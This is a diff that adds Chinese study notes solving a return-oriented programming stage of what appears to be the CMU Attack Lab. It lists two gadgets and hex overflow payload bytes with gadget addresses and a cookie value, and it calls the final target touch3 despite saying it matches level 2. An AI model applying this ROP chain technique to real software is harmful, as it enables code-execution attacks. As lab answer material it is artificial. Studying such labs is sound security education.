@@ -127,4 +127,45 @@
     2. 仅能使用 %rax - %rdi 的寄存器
     3. 仅能使用 movq popq ret nop 指令去构造我们的 gadget
     4. 本次攻击仅能使用两种 gadget
+  
+  * SOLVE:
+    1. 本关的跳转目的和 LEVEL2 保持一致，但是在 rtaget 的基础上，栈被设置了现代操作系统所提供的防溢出机制.
+    2. 因为要根据已有代码的基础上封装自己的 gadget，所以实际执行指令有限，根据 attacklab.pdf/Figure_3_A_B 
+    和 gadget farm 中的代码可得，可得出以下指令
 
+     gadget_1:
+      pop %rax
+      nop
+      retq
+
+     gadget_2:
+      movq %rax, %rdi
+      retq
+
+    我们先将 gadget_1 的首地址写入栈中，覆盖至 getbuf 存储用于返回上一个栈帧的区域，那么当 getbuf 返回时，首先执
+    行 gadget_1.
+    gadget_1 执行时会在栈中继续弹出数据并赋值给 rax，故我们还要保证一个写入的数据区的下一个韦志中包含有 $rax 所需
+    要的数据，在这里，这个数据即为 cookie 的值.
+
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      cc 19 40 00 00 00 00 00 /* pop %rax; nop; retq */
+      fa 97 b9 59 00 00 00 00 /* cookie data */
+    
+    当 gadgets 在栈中构造好后，一旦一个 gadget 被执行，那么就会发起一个 gadget 执行链，下一个 gadget 的执行依赖于上一个
+    gadget 的 ret 返回，那么在内存的下一段区域，我们还要继续写入 gadget_2 的地址.
+    在 gadget_2 的工作能够依据 %rax 初始化完 %rdi，故当其执行完毕后，我们下一段跳转的地址则为 attack function 的地址了，
+    即 <touch3> 的地址.
+
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      cc 19 40 00 00 00 00 00 /* pop %rax; nop; retq */
+      fa 97 b9 59 00 00 00 00 /* cookie data */
+      a2 19 40 00 00 00 00 00 /* movq %rax, %rdi; retq */
+      
